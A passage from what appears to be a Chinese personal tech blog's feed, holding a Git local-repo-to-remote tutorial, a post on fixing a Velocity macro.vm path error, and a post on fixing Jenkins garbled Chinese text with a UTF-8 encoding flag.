class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> On branch master</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Initial commit</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Changes to be committed:</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   (use <span class="string">&quot;git rm --cached &lt;file&gt;...&quot;</span> to unstage)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment">#   new file:   bootstrap/css/bootstrap-theme.css推送本地git仓库</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   bootstrap/css/bootstrap-theme.min.css</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   bootstrap/css/bootstrap.css</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   bootstrap/css/bootstrap.min.css</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   bootstrap/css/custom.css</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   bootstrap/css/offcanvas.css</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   bootstrap/fonts/glyphicons-halflings-regular.eot</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   bootstrap/fonts/glyphicons-halflings-regular.svg</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   bootstrap/fonts/glyphicons-halflings-regular.ttf</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   bootstrap/fonts/glyphicons-halflings-regular.woff</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   bootstrap/js/bootstrap.js</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   bootstrap/js/bootstrap.min.js</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   bootstrap/js/holder.js</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   new file:   index.html</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Untracked files:</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   (use <span class="string">&quot;git add &lt;file&gt;...&quot;</span> to include <span class="keyword">in</span> what will be committed)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment">#   .project</span></span></span><br></pre></td></tr></table></figure><h2 id="七、提交索引内容到仓库-repository"><a href="#七、提交索引内容到仓库-repository" class="headerlink" title="七、提交索引内容到仓库(repository)"></a>七、提交索引内容到仓库(repository)</h2><p><code>git commit -m &quot;My first commit&quot;</code></p><p>应该能看到类似如下的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[master (root-commit) c43daef] My first commit</span><br><span class="line">14 files changed, 9927 insertions(+)</span><br><span class="line">create mode 100644 bootstrap/css/bootstrap-theme.css</span><br><span class="line">create mode 100644 bootstrap/css/bootstrap-theme.min.css</span><br><span class="line">create mode 100644 bootstrap/css/bootstrap.css</span><br><span class="line">create mode 100644 bootstrap/css/bootstrap.min.css</span><br><span class="line">create mode 100644 bootstrap/css/custom.css</span><br><span class="line">create mode 100755 bootstrap/css/offcanvas.css</span><br><span class="line">create mode 100644 bootstrap/fonts/glyphicons-halflings-regular.eot</span><br><span class="line">create mode 100644 bootstrap/fonts/glyphicons-halflings-regular.svg</span><br><span class="line">create mode 100644 bootstrap/fonts/glyphicons-halflings-regular.ttf</span><br><span class="line">create mode 100644 bootstrap/fonts/glyphicons-halflings-regular.woff</span><br><span class="line">create mode 100644 bootstrap/js/bootstrap.js</span><br><span class="line">create mode 100644 bootstrap/js/bootstrap.min.js</span><br><span class="line">create mode 100755 bootstrap/js/holder.js</span><br><span class="line">create mode 100644 index.html</span><br></pre></td></tr></table></figure><h2 id="八、提交索引内容到仓库-repository"><a href="#八、提交索引内容到仓库-repository" class="headerlink" title="八、提交索引内容到仓库(repository)"></a>八、提交索引内容到仓库(repository)</h2><p><code>git status</code></p><p>应该能看到类似如下的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> On branch master</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Initial commit</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Untracked files:</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   (use <span class="string">&quot;git add &lt;file&gt;...&quot;</span> to include <span class="keyword">in</span> what will be committed)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment">#   .project</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   bootstrap/</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   index.html</span></span><br><span class="line">nothing added to commit but untracked files present (use &quot;git add&quot; to track) </span><br></pre></td></tr></table></figure><h2 id="九、创建git账户及远程代码仓库"><a href="#九、创建git账户及远程代码仓库" class="headerlink" title="九、创建git账户及远程代码仓库"></a>九、创建git账户及远程代码仓库</h2><h2 id="十、连接本地仓库与远程仓库"><a href="#十、连接本地仓库与远程仓库" class="headerlink" title="十、连接本地仓库与远程仓库"></a>十、连接本地仓库与远程仓库</h2><p><code>git remote add origin git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git</code></p><p>应该能看到类似如下的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Counting objects: 20, done.</span><br><span class="line">Delta compression using up to 8 threads.</span><br><span class="line">Compressing objects: 100% (20/20), done.</span><br><span class="line">Writing objects: 100% (20/20), 121.70 KiB | 0 bytes/s, done.</span><br><span class="line">Total 20 (delta 2), reused 0 (delta 0)</span><br><span class="line">To https://github.com/your_name/your_repo.git</span><br><span class="line">* [new branch]      master -&gt; master</span><br><span class="line">Branch master set up to track remote branch master from origin.</span><br></pre></td></tr></table></figure><h2 id="十一、推送本地仓库到远程仓库"><a href="#十一、推送本地仓库到远程仓库" class="headerlink" title="十一、推送本地仓库到远程仓库"></a>十一、推送本地仓库到远程仓库</h2><p><code>git push -u origin master</code></p><p>应该能看到类似如下的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Counting objects: 10, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (6/6), done.</span><br><span class="line">Writing objects: 100% (9/9), 1.33 KiB | 0 bytes/s, done.</span><br><span class="line">Total 9 (delta 0), reused 0 (delta 0)</span><br><span class="line">To git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git</span><br><span class="line">   8a82c26..90efea5  master -&gt; master</span><br><span class="line">分支 master 设置为跟踪来自 origin 的远程分支 master。</span><br></pre></td></tr></table></figure><h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><p>如若出现如下错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">To git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git</span><br><span class="line"> ! [rejected]        master -&gt; master (fetch first)</span><br><span class="line">error: 无法推送一些引用到 &#x27;git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git&#x27;</span><br><span class="line">提示：更新被拒绝，因为远程版本库包含您本地尚不存在的提交。这通常是因为另外</span><br><span class="line">提示：一个版本库已向该引用进行了推送。再次推送前，您可能需要先整合远程变更</span><br><span class="line">提示：（如 &#x27;git pull ...&#x27;）。</span><br><span class="line">提示：详见 &#x27;git push --help&#x27; 中的 &#x27;Note about fast-forwards&#x27; 小节。</span><br></pre></td></tr></table></figure><p>说明，远程代码仓库已经存在部分代码，且未 pull 最新代码到本地仓库，出现冲突。<br>此时，执行如下命令即可：<br><code>git pull origin master</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">来自 git.oschina.net:yeshaoting/martinye-demo-spring-velocity</span><br><span class="line"> * branch            master     -&gt; FETCH_HEAD</span><br><span class="line">Merge made by the &#x27;recursive&#x27; strategy.</span><br><span class="line"> LICENSE   | 191 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line"> README.md |   1 +</span><br><span class="line"> 2 files changed, 192 insertions(+)</span><br><span class="line"> create mode 100644 LICENSE</span><br><span class="line"> create mode 100644 README.md</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/git.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;本文参考：&lt;a href=&quot;https://www.texniq.de/en/web-engineering-i/create-local-git-repo-and-push-to-github&quot;&gt;Create Local Git Repo &amp;amp; Push to GitHub&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;一、打开终端&quot;&gt;&lt;a href=&quot;#一、打开终端&quot; class=&quot;headerlink&quot; title=&quot;一、打开终端&quot;&gt;&lt;/a&gt;一、打开终端&lt;/h2&gt;&lt;h2 id=&quot;二、到本地文件目录&quot;&gt;&lt;a href=&quot;#二、到本地文件目录&quot; class=&quot;headerlink&quot; title=&quot;二、到本地文件目录&quot;&gt;&lt;/a&gt;二、到本地文件目录&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;cd /home/developer/public_html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;三、配置git&quot;&gt;&lt;a href=&quot;#三、配置git&quot; class=&quot;headerlink&quot; title=&quot;三、配置git&quot;&gt;&lt;/a&gt;三、配置git&lt;/h2&gt;&lt;p&gt;用户名：&lt;br&gt;&lt;code&gt;git config --global user.name &amp;quot;叶绍亭&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;邮箱：&lt;br&gt;&lt;code&gt;git config --global user.email &amp;quot;yeshaoting@163.com&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;配色方案：&lt;br&gt;&lt;code&gt;git config --global color.ui auto&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;四、-项目初始化&quot;&gt;&lt;a href=&quot;#四、-项目初始化&quot; class=&quot;headerlink&quot; title=&quot;四、 项目初始化&quot;&gt;&lt;/a&gt;四、 项目初始化&lt;/h2&gt;&lt;p&gt;&lt;code&gt;git init&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;初始化成功会看到如下内容：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;Initialized empty Git repository in home/developer/public_html/.git&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="版本控制" scheme="http://yeshaoting.cn/categories/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"/>
    
    
    <category term="git" scheme="http://yeshaoting.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>velocity宏文件macro.vm缺失</title>
    <link href="http://yeshaoting.cn/article/java/velocity%E5%AE%8F%E6%96%87%E4%BB%B6macro.vm%E7%BC%BA%E5%A4%B1/"/>
    <id>http://yeshaoting.cn/article/java/velocity%E5%AE%8F%E6%96%87%E4%BB%B6macro.vm%E7%BC%BA%E5%A4%B1/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/velocity.png" class="img-logo img-center" /><p>异常描述：VelocityException: Velocimacro : Error using VM library : /WEB-INF/vm/macro.vm<br>问题原因：路径配置错误。</p><h2 id="一、项目相关配置"><a href="#一、项目相关配置" class="headerlink" title="一、项目相关配置"></a>一、项目相关配置</h2><h3 id="1-spring-beans-xml"><a href="#1-spring-beans-xml" class="headerlink" title="1. spring-beans.xml"></a>1. spring-beans.xml</h3><p>spring bean velocityEngine</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;velocityEngine&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.ui.velocity.VelocityEngineFactoryBean&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;resourceLoaderPath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/vm/&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;configLocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath:velocity.properties&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-velocity-properties"><a href="#2-velocity-properties" class="headerlink" title="2. velocity.properties"></a>2. velocity.properties</h3><p>宏资源文件配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">velocimacro.library</span>=<span class="string">/WEB-INF/vm/macro.vm</span></span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="二、解析异常原因"><a href="#二、解析异常原因" class="headerlink" title="二、解析异常原因"></a>二、解析异常原因</h2><p>首先，默认velocity模板加载方式为file，对应的资源加载类为：<code>org.apache.velocity.runtime.resource.loader.FileResourceLoader</code>。参见如下 <strong>模板加载配置</strong> 以及 <strong>FileResourceLoader说明</strong> 。</p><p>从模板目录/WEB-INF/vm/加载模块文件(<code>ResourceManagerImpl.getResource</code>)。</p><p>如果模板文件没有缓存(<code>ResourceManagerImpl.globalCacheglobalCache</code>)，则从目录文件中加载(<code>ResourceManagerImpl.loadResource</code>)。</p><p>加载过程中，加载资源文件流，解析并初始化。<code>org.apache.velocity.Template.process()</code><br>此时，调用资源文件加载类FileResourceLoader加载文件。</p><p>FileResourceLoader在file.resource.loader.path目录，即spring-beans.xml中配置的resourceLoaderPath目录通过模板名查找并加载模板。<br>如果resourceLoaderPath未配置或者为空的话，则通过绝对路径加载模板；否则，相对于resourceLoaderPath查找模板。<br>如果resourceLoaderPath不为空，模板路径velocimacro.library以/开头，则直接去除/。</p><h3 id="模板加载配置"><a href="#模板加载配置" class="headerlink" title="模板加载配置"></a>模板加载配置</h3><p>默认的velocity.properties in package <code>org.apache.velocity.runtime.defaults</code>。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">resource.loader</span> = <span class="string">file</span></span><br><span class="line"></span><br><span class="line"><span class="meta">file.resource.loader.description</span> = <span class="string">Velocity File Resource Loader</span></span><br><span class="line"><span class="meta">file.resource.loader.class</span> = <span class="string">org.apache.velocity.runtime.resource.loader.FileResourceLoader</span></span><br><span class="line"><span class="meta">file.resource.loader.path</span> = <span class="string">.</span></span><br><span class="line"><span class="meta">file.resource.loader.cache</span> = <span class="string">false</span></span><br><span class="line"><span class="meta">file.resource.loader.modificationCheckInterval</span> = <span class="string">2</span></span><br></pre></td></tr></table></figure><h3 id="FileResourceLoader说明"><a href="#FileResourceLoader说明" class="headerlink" title="FileResourceLoader说明"></a>FileResourceLoader说明</h3><p>A loader for templates stored on the file system. Treats the template as relative to the configured root path. If the root path is empty treats the template name as an absolute path.</p><h2 id="三、小结"><a href="#三、小结" class="headerlink" title="三、小结"></a>三、小结</h2><p>因此，对于当前的项目配置来说，velocity框架实际上是在/WEB-INF/vm/WEB-INF/vm/macro.vm目录加载模板文件macro.vm。</p><p><strong>注</strong>：如果希望在class目录加载模板文件，可以考试设置资源文件加载类为：org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader。</p><p>修改velocity.properties配置：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">resource.loader</span> = <span class="string">class</span></span><br><span class="line"><span class="meta">class.resource.loader.class</span> = <span class="string">org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader</span></span><br><span class="line"></span><br><span class="line"><span class="meta">velocimacro.library</span>=<span class="string">macro.vm</span></span><br></pre></td></tr></table></figure><h2 id="四、参考文档"><a href="#四、参考文档" class="headerlink" title="四、参考文档"></a>四、参考文档</h2><p><a href="http://stackoverflow.com/questions/3443819/velocity-cant-find-resource">http://stackoverflow.com/questions/3443819/velocity-cant-find-resource</a><br><a href="http://velocity.apache.org/engine/releases/velocity-1.6.4/developer-guide.html#Configuring_Resource_Loaders">http://velocity.apache.org/engine/releases/velocity-1.6.4/developer-guide.html#Configuring_Resource_Loaders</a><br><a href="http://velocity.apache.org/engine/releases/velocity-1.6.4/apidocs/org/apache/velocity/runtime/resource/loader/ClasspathResourceLoader.html">http://velocity.apache.org/engine/releases/velocity-1.6.4/apidocs/org/apache/velocity/runtime/resource/loader/ClasspathResourceLoader.html</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/velocity.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;异常描述：VelocityException: Velocimacro : Error using VM library : /WEB-INF/vm/macro.vm&lt;br&gt;问题原因：路径配置错误。&lt;/p&gt;
&lt;h2 id=&quot;一、项目相关配置&quot;&gt;&lt;a href=&quot;#一、项目相关配置&quot; class=&quot;headerlink&quot; title=&quot;一、项目相关配置&quot;&gt;&lt;/a&gt;一、项目相关配置&lt;/h2&gt;&lt;h3 id=&quot;1-spring-beans-xml&quot;&gt;&lt;a href=&quot;#1-spring-beans-xml&quot; class=&quot;headerlink&quot; title=&quot;1. spring-beans.xml&quot;&gt;&lt;/a&gt;1. spring-beans.xml&lt;/h3&gt;&lt;p&gt;spring bean velocityEngine&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;velocityEngine&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;org.springframework.ui.velocity.VelocityEngineFactoryBean&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;resourceLoaderPath&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;/WEB-INF/vm/&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;configLocation&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;classpath:velocity.properties&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2-velocity-properties&quot;&gt;&lt;a href=&quot;#2-velocity-properties&quot; class=&quot;headerlink&quot; title=&quot;2. velocity.properties&quot;&gt;&lt;/a&gt;2. velocity.properties&lt;/h3&gt;&lt;p&gt;宏资源文件配置&lt;/p&gt;
&lt;figure class=&quot;highlight properties&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;velocimacro.library&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;/WEB-INF/vm/macro.vm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
    <category term="velocity" scheme="http://yeshaoting.cn/tags/velocity/"/>
    
  </entry>
  
  <entry>
    <title>jenkins中文乱码与服务启动</title>
    <link href="http://yeshaoting.cn/article/jenkins/jenkins%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8/"/>
    <id>http://yeshaoting.cn/article/jenkins/jenkins%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T07:42:18.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/jenkins.png" class="img-logo img-center" /><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>项目构建<strong>最新修改记录</strong>中文乱码。</p><h2 id="问题查看与分析"><a href="#问题查看与分析" class="headerlink" title="问题查看与分析"></a>问题查看与分析</h2><p>首先，查看jenkins管理界面的<strong>系统属性</strong>功能。<br>对应URL地址为：<a href="http://jenkins.xxx.com/systemInfo">http://jenkins.xxx.com/systemInfo</a></p><p>可以看到jenkins启动环境变量file.encoding值为默认的<strong>ISO-8859-1</strong>(Latin-1字符集)。<br>不希望jenkins乱码，需要设置其编码方式为UTF-8。(参考：<a href="http://blog.csdn.net/hunterno4/article/details/38424715">Jenkins控制台中乱码问题</a>)</p><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>当前jenkins启动命令为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20</span><br></pre></td></tr></table></figure><p>在启动jenkins时，需要额外添加参数<strong>file.encoding</strong>，并设置其参数值为UTF-8。<br>修改后的启动命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20 -Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure><h3 id="扩展说明"><a href="#扩展说明" class="headerlink" title="扩展说明"></a>扩展说明</h3><p>由jenkins启动命令可看出：</p><ol><li><p>jenkins安装目录<br>/var/lib/jenkins</p></li><li><p>jenkins服务部署代码<br>/usr/lib/jenkins/jenkins.war</p></li><li><p>运行日志<br>/var/log/jenkins/jenkins.log</p></li><li><p>jenkins代码部署位置<br>/var/cache/jenkins/war</p></li><li><p>jenkins服务端口<br>http: 8080<br>ajp13: 8009</p></li><li><p>jenkins servlet容器<br>jenkins服务运行在winstone servlet容器，类似于tomcat, jetty等。<br>jenkins命令启动接收的参数<code>--logfile</code>, <code>--webroot</code>, <code>--httpPort</code>, <code>--ajp13Port</code>等都是winstone的。<br>另外，查看了webroot参数对应的目录，发现目录包含类库<strong>winstone.jar</strong>，也可知jenkins可能是放在winstone容器里运行的。</p></li></ol><p>关于winstone可参考：<a href="http://winstone.sourceforge.net/">Winstone Servlet Container v0.9.10</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/jenkins.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="持续集成" scheme="http://yeshaoting.cn/categories/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"/>
    
    
    <category term="jenkins" scheme="http://yeshaoting.cn/tags/jenkins/"/>
    
    <category term="issue" scheme="http://yeshaoting.cn/tags/issue/"/>
    
  </entry>
  
  <entry>
    <title>jenkins任务等待下一次可用执行</title>
    <link href="http://yeshaoting.cn/article/jenkins/jenkins%E4%BB%BB%E5%8A%A1%E7%AD%89%E5%BE%85%E4%B8%8B%E4%B8%80%E6%AC%A1%E5%8F%AF%E7%94%A8%E6%89%A7%E8%A1%8C/"/>
    <id>http://yeshaoting.cn/article/jenkins/jenkins%E4%BB%BB%E5%8A%A1%E7%AD%89%E5%BE%85%E4%B8%8B%E4%B8%80%E6%AC%A1%E5%8F%AF%E7%94%A8%E6%89%A7%E8%A1%8C/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
